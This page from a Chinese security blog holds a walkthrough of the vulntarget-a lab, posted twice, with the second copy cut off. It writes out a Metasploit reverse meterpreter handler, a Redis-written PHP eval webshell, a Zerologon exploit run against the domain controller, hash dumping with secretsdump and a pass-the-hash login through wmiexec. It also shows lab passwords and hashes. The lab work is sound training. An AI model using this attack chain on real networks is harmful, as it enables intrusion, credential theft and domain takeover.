<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hello</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hello">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hello">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="suhaynn">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hello" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hello</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Vulntarget-A - 副本 (4)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/26/Vulntarget-A%20-%20%E5%89%AF%E6%9C%AC%20(4)/" class="article-date">
  <time class="dt-published" datetime="2025-01-26T09:18:34.932Z" itemprop="datePublished">2025-01-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/26/Vulntarget-A%20-%20%E5%89%AF%E6%9C%AC%20(4)/">Vulntarget-A - 副本 (4)</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p>vulntarget-a漏洞靶场是由vulntarget大佬团队自己设计搭建的靶场，其中涵盖Web漏洞、主机漏洞、域漏洞、工控漏洞等等。</p>
<h2 id="靶场拓扑"><a href="#靶场拓扑" class="headerlink" title="靶场拓扑"></a>靶场拓扑</h2><p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728819066162-ebda5fd5-3f59-4886-801d-f921c73739d7.png"></p>
<p>以上拓扑图仅做参考，实战中的地址为以下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali攻击机：192.168.52.128</span><br><span class="line"></span><br><span class="line">win11攻击机：192.168.52.1</span><br><span class="line"></span><br><span class="line">win7应用服务器：192.168.127.89，10.0.20.98</span><br><span class="line"></span><br><span class="line">win16域成员服务器：10.0.20.99,10.0.10.111</span><br><span class="line"></span><br><span class="line">win19域控服务器：10.0.10.110</span><br></pre></td></tr></table></figure>

<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>下载地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接: https://pan.baidu.com/s/195iUmvbaKOhtn2S_O-F6TA 提取码: jnkq</span><br></pre></td></tr></table></figure>

<p>如需要自己搭建设计可以参考：</p>
<p><a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&mid=2247486312&idx=1&sn=1bd4a6edcd6bc0133215d2fb79abe53b&chksm=cecf7150f9b8f846820c14ff5df467afe67e913b8592715bf7bf76cb011c407df6ead15819d3&scene=21#wechat_redirect">http://mp.weixin.qq.com/s?__biz&#x3D;Mzg3NDYwNjQyMw&#x3D;&#x3D;&amp;mid&#x3D;2247486312&amp;idx&#x3D;1&amp;sn&#x3D;1bd4a6edcd6bc0133215d2fb79abe53b&amp;chksm&#x3D;cecf7150f9b8f846820c14ff5df467afe67e913b8592715bf7bf76cb011c407df6ead15819d3&amp;scene&#x3D;21#wechat_redirect</a></p>
<p>需要注意的是，从网盘下载的靶机是搭建好的，我们改一下VMnet8的网卡C段，改一下他的DHCP，让Net网卡起始IP小于192.168.127.98，因为这是他的通达OA配置上的IP地址<img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728819207035-80d07cd1-c3c1-4ab1-b35b-1995cee99bc7.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728819406422-5d660123-4b3e-4a33-9e0a-14767abda46f.png"></p>
<table>
<thead>
<tr>
<th>主机名称</th>
<th>IP</th>
<th>用户名</th>
<th>密码</th>
<th>网卡</th>
</tr>
</thead>
<tbody><tr>
<td>win7</td>
<td>192.168.127.91<br/>10.0.20.89</td>
<td>win7</td>
<td>admin</td>
<td>VMnet2<br/>VMnet8</td>
</tr>
<tr>
<td>winserver2016</td>
<td>10.0.20.99<br/>10.0.10.111</td>
<td>vulntarget.com\win2016</td>
<td>Admin#123</td>
<td>VMnet2<br/>VMnet3</td>
</tr>
<tr>
<td>winserver2019</td>
<td>10.0.10.110</td>
<td>administrator</td>
<td>Admin@666</td>
<td>VMnet3</td>
</tr>
</tbody></table>
<h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><h2 id="第一台主机win7"><a href="#第一台主机win7" class="headerlink" title="第一台主机win7"></a>第一台主机win7</h2><h3 id="Fscan扫描"><a href="#Fscan扫描" class="headerlink" title="Fscan扫描"></a>Fscan扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.127.0/24</span><br></pre></td></tr></table></figure>

<p>扫出来目标IP：192.168.127.91</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728819724886-c04180e9-ac67-43ce-b73c-3adbd0562e89.png"></p>
<p>分析一下扫描结果</p>
<p>发现开放80，135，139，445端口，80端口是通达OA，目标主机是一台win7，且存在永恒之蓝</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728820088062-2972ce29-c1ab-4f7d-b495-513e662a2b70.png"></p>
<h3 id="通达漏洞拿下应用服务"><a href="#通达漏洞拿下应用服务" class="headerlink" title="通达漏洞拿下应用服务"></a>通达漏洞拿下应用服务</h3><p>拿通达OA扫描器漏扫一下</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728820414107-1ebaec8f-6c32-4418-a8c7-50a7d6dd7793.png"></p>
<p>发现漏洞还不少，直接一键getshell</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728820485481-1eeebc73-f39d-40df-aa44-25d804e787fa.png"></p>
<p>发现权限还不低，system权限，还存在双网卡</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728820548834-37ca1b47-9ffb-4f29-88eb-3140d116307e.png"></p>
<h3 id="判断是否出网"><a href="#判断是否出网" class="headerlink" title="判断是否出网"></a>判断是否出网</h3><p>ping了一下百度，通了是出网的，那就准备上线MSF</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728822650638-c9a77b6b-d2c0-438e-9e08-9706f8544082.png"></p>
<h3 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h3><p>因为出网我就生成反向exe了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">生成exe木马</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728823061202-e5eb3de3-3984-4290-a52d-f19e1f5035ea.png"></p>
<p>上传到靶机win7</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728823052788-563a6961-3b5d-4480-9fbc-c2ec14fb3c96.png"></p>
<p>攻击机VPS开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">使用exploit/multi/handler模块开启监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">设置监听器的有效载荷类型为 Windows 平台的反向 TCP Meterpreter。</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">设置监听端口为3333</span><br><span class="line">set lport 3333</span><br><span class="line">设置监听IP地址</span><br><span class="line">set lhost 192.168.127.10</span><br><span class="line">启动监听器</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728823191584-9e60aa4e-a938-412e-962c-fe534c342d6e.png"></p>
<h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><p>扫描<code>10.0.20.0/24</code>网段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set ports 22,23,80,443,8080,8081,3389,445,143,6379</span><br><span class="line">set rhosts 10.0.20.0/24</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>发现第二胎机子10.0.20.99</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728875326920-45475908-09cc-4fd0-a238-25c792a7a277.png"></p>
<h2 id="第二台主机"><a href="#第二台主机" class="headerlink" title="第二台主机"></a>第二台主机</h2><p>配置路由</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 10.0.20.0/24    #添加目标网段路由规则，获取内部网络访问通道</span><br><span class="line">run post/windows/manage/migrate</span><br><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728876090934-ff25f1d4-7a97-4c39-ac8c-c583830bf7fe.png"></p>
<h3 id="配置socks5代理"><a href="#配置socks5代理" class="headerlink" title="配置socks5代理"></a>配置socks5代理</h3><p>msf配置socks5代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy  #使用 socks_proxy模块</span><br><span class="line">set version 5	#使用版本4a</span><br><span class="line">set srvhost 127.0.0.1	#设置本地IP</span><br><span class="line">set srvport 1080	#设置监听端口1080</span><br><span class="line">exploit		#运行</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728875659345-373845f5-4080-4fdc-a549-480de258cd32.png"></p>
<p>kali配置代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728823898898-afba3863-d055-4adb-84c8-6e8609b5c23a.png"></p>
<p>测试，可以看到不挂代理是访问不到10.0.20.98的</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728876459765-b6cbb82c-d3b0-49f5-95e5-5b71a26daf4d.png"></p>
<p>扫描常见开放端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 10.0.20.99 -p22,23,80,139,445,1433,3306,3389,6379,8080</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728878747855-0d3e82f1-d73f-43ff-923a-38336d117423.png"></p>
<p>应该是一台windows，开放80端口</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728879196149-0cc81fcc-b662-4bef-9821-3b7c1cc6bab9.png">+</p>
<h3 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h3><p>6379端口有redis，连接一下看是否有redis未授权</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728879574446-91c81da3-a28f-4345-8605-860686694d37.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728879701456-10ad0f07-3b8e-415d-b795-57ec5fffe808.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config get <span class="built_in">dir</span> <span class="comment">#查看redis数据库路径</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> <span class="string">&quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span># <span class="comment">#修改靶机Redis数据库路径</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php <span class="comment">#生成shell.php文件</span></span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span>#将一句话木马写入文件中</span><br><span class="line"><span class="comment">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span></span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php eval(<span class="variable">$_POST</span>[123]);?&gt;\r\n\r\n&quot;</span>#上传木马可以通过蚁剑连接</span><br><span class="line">save#保存</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728880392356-e4435a41-19ab-4a9e-9d91-958582337096.png"></p>
<p>连接蚁剑</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728880437112-d5410634-bd90-450b-befe-1534ba4a3ca7.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728880534484-4389dc01-8944-477b-b69e-ff329ae5119a.png"></p>
<h3 id="判断是否出网-1"><a href="#判断是否出网-1" class="headerlink" title="判断是否出网"></a>判断是否出网</h3><p>不出网</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728881551296-59d63386-7f28-4dd1-8735-34a973dc7d56.png"></p>
<h3 id="探测主机"><a href="#探测主机" class="headerlink" title="探测主机"></a>探测主机</h3><p>存在两张网卡</p>
<p>10.0.20.0&#x2F;24</p>
<p>10.0.10.0&#x2F;24</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728881513359-1c282257-2e9e-4f63-ba35-702e8d32b066.png"></p>
<p>上传fscan</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728882928069-7a74ec2e-a33d-4ccc-bfa5-c8ed75af9004.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 10.0.10.0/24</span><br></pre></td></tr></table></figure>

<p>发现第三台主机，且是域控</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728883178963-08b52fe4-6416-4dbc-b800-1abc6c6a714b.png"></p>
<h2 id="第三台主机"><a href="#第三台主机" class="headerlink" title="第三台主机"></a>第三台主机</h2><h3 id="攻击域控"><a href="#攻击域控" class="headerlink" title="攻击域控"></a>攻击域控</h3><p>现在已经确定域控的IP10.0.10.110</p>
<p>EXP地址：<a target="_blank" rel="noopener" href="https://github.com/VoidSec/CVE-2020-1472">https://github.com/VoidSec/CVE-2020-1472</a></p>
<p>exp利用需要将impacket包更新下：python -m pip install –upgrade impacket</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py -n WIN2019 -t 10.0.10.110</span><br></pre></td></tr></table></figure>

<p>漏洞扫出来了，是否攻击，选是</p>
<h3 id="置空域控密码"><a href="#置空域控密码" class="headerlink" title="置空域控密码"></a>置空域控密码</h3><p>此时域控密码已经置空</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728885185035-4bb19250-830c-4982-9d35-dc08a0014625.png"></p>
<h3 id="获取新凭据"><a href="#获取新凭据" class="headerlink" title="获取新凭据"></a><strong>获取新凭据</strong></h3><p>用secretsdump.py来获取域控中保存的hash，secretsdump.py脚本在kali自带impacket包中，在&#x2F;usr&#x2F;local&#x2F;bin路径下，或者手动下载脚本模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket</span><br><span class="line">git clone https://github.com/CoreSecurity/impacket.git</span><br><span class="line">cd impacket/</span><br><span class="line">python3 -m pip install .  </span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>

<p>利用impcker包中的seretsdump抓hash值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py 域名称/域控主机名\<span class="variable">$@</span>域控IP -no-pass</span><br><span class="line">proxychains4 python3 secretsdump.py vulntarget.com/win2019\<span class="variable">$@10</span>.0.10.110 -no-pass</span><br></pre></td></tr></table></figure>

<p>查看域名，主机名</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728885356598-0c478f6c-5fe2-442f-8cc7-478e579af5dc.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1718783564146-d1dc6089-64bd-4f5c-9229-13f0404ad83f.png"></p>
<p>出现这个问题 [*] Cleaning up …</p>
<p>此错误与 Impacket 库和示例之间的版本不匹配有关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd impacket/</span><br><span class="line">python3 -m pip install .  </span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>

<p>这里获取的凭据是域管理员密码已被置空后的凭据，域控密码已成功置空</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728886117892-13ee4e14-72c7-4e15-96a2-0d72e95ef927.png"></p>
<p>域机器账户的空密码，解码为空</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728885995606-de34088f-bb61-4bca-9bac-5ebd2c8ffa84.png"></p>
<p>域管理员账号解码为：Admin@666</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728886187960-4b7d9400-485e-4002-a758-c07d93f75bce.png"></p>
<h3 id="获取域控半交互式shell"><a href="#获取域控半交互式shell" class="headerlink" title="获取域控半交互式shell"></a>获取域控半交互式shell</h3><p>使用wmiexec进行hash传递攻击，这个脚本也在kali自带impacket包中，&#x2F;usr&#x2F;local&#x2F;bin路径下</p>
<p>获取到hash之后接下来我们就可以利用常见横向工具wmiexec.py进行登录，生成一个半交互式shell(管理员权限)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes 域管理员<span class="built_in">hash</span> 域名/Administrator@域控IP</span><br><span class="line">proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 vulntarget.com/Administrator@10.0.10.110</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/%20(4)/1728886524050-a5500832-ef06-4712-ba23-c68e9c462e63.png"></p>
<p>后续还可以获取初始凭据（sam），针对注册表将sam转储到域控本地，然后再保存到本机并利用secretsdump.py解析已经下载到在本地的sam文件，不在演示了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/26/Vulntarget-A%20-%20%E5%89%AF%E6%9C%AC%20(4)/" data-id="cm6df1isf000060hq4t9lh22u" data-title="Vulntarget-A - 副本 (4)" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Vulntarget-A - 副本" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/26/Vulntarget-A%20-%20%E5%89%AF%E6%9C%AC/" class="article-date">
  <time class="dt-published" datetime="2025-01-26T09:18:34.149Z" itemprop="datePublished">2025-01-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p>vulntarget-a漏洞靶场是由vulntarget大佬团队自己设计搭建的靶场，其中涵盖Web漏洞、主机漏洞、域漏洞、工控漏洞等等。</p>
<h2 id="靶场拓扑"><a href="#靶场拓扑" class="headerlink" title="靶场拓扑"></a>靶场拓扑</h2><p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728819066162-ebda5fd5-3f59-4886-801d-f921c73739d7.png"></p>
<p>以上拓扑图仅做参考，实战中的地址为以下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali攻击机：192.168.52.128</span><br><span class="line"></span><br><span class="line">win11攻击机：192.168.52.1</span><br><span class="line"></span><br><span class="line">win7应用服务器：192.168.127.89，10.0.20.98</span><br><span class="line"></span><br><span class="line">win16域成员服务器：10.0.20.99,10.0.10.111</span><br><span class="line"></span><br><span class="line">win19域控服务器：10.0.10.110</span><br></pre></td></tr></table></figure>

<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>下载地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接: https://pan.baidu.com/s/195iUmvbaKOhtn2S_O-F6TA 提取码: jnkq</span><br></pre></td></tr></table></figure>

<p>如需要自己搭建设计可以参考：</p>
<p><a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&mid=2247486312&idx=1&sn=1bd4a6edcd6bc0133215d2fb79abe53b&chksm=cecf7150f9b8f846820c14ff5df467afe67e913b8592715bf7bf76cb011c407df6ead15819d3&scene=21#wechat_redirect">http://mp.weixin.qq.com/s?__biz&#x3D;Mzg3NDYwNjQyMw&#x3D;&#x3D;&amp;mid&#x3D;2247486312&amp;idx&#x3D;1&amp;sn&#x3D;1bd4a6edcd6bc0133215d2fb79abe53b&amp;chksm&#x3D;cecf7150f9b8f846820c14ff5df467afe67e913b8592715bf7bf76cb011c407df6ead15819d3&amp;scene&#x3D;21#wechat_redirect</a></p>
<p>需要注意的是，从网盘下载的靶机是搭建好的，我们改一下VMnet8的网卡C段，改一下他的DHCP，让Net网卡起始IP小于192.168.127.98，因为这是他的通达OA配置上的IP地址<img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728819207035-80d07cd1-c3c1-4ab1-b35b-1995cee99bc7.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728819406422-5d660123-4b3e-4a33-9e0a-14767abda46f.png"></p>
<table>
<thead>
<tr>
<th>主机名称</th>
<th>IP</th>
<th>用户名</th>
<th>密码</th>
<th>网卡</th>
</tr>
</thead>
<tbody><tr>
<td>win7</td>
<td>192.168.127.91<br/>10.0.20.89</td>
<td>win7</td>
<td>admin</td>
<td>VMnet2<br/>VMnet8</td>
</tr>
<tr>
<td>winserver2016</td>
<td>10.0.20.99<br/>10.0.10.111</td>
<td>vulntarget.com\win2016</td>
<td>Admin#123</td>
<td>VMnet2<br/>VMnet3</td>
</tr>
<tr>
<td>winserver2019</td>
<td>10.0.10.110</td>
<td>administrator</td>
<td>Admin@666</td>
<td>VMnet3</td>
</tr>
</tbody></table>
<h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><h2 id="第一台主机win7"><a href="#第一台主机win7" class="headerlink" title="第一台主机win7"></a>第一台主机win7</h2><h3 id="Fscan扫描"><a href="#Fscan扫描" class="headerlink" title="Fscan扫描"></a>Fscan扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.127.0/24</span><br></pre></td></tr></table></figure>

<p>扫出来目标IP：192.168.127.91</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728819724886-c04180e9-ac67-43ce-b73c-3adbd0562e89.png"></p>
<p>分析一下扫描结果</p>
<p>发现开放80，135，139，445端口，80端口是通达OA，目标主机是一台win7，且存在永恒之蓝</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728820088062-2972ce29-c1ab-4f7d-b495-513e662a2b70.png"></p>
<h3 id="通达漏洞拿下应用服务"><a href="#通达漏洞拿下应用服务" class="headerlink" title="通达漏洞拿下应用服务"></a>通达漏洞拿下应用服务</h3><p>拿通达OA扫描器漏扫一下</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728820414107-1ebaec8f-6c32-4418-a8c7-50a7d6dd7793.png"></p>
<p>发现漏洞还不少，直接一键getshell</p>
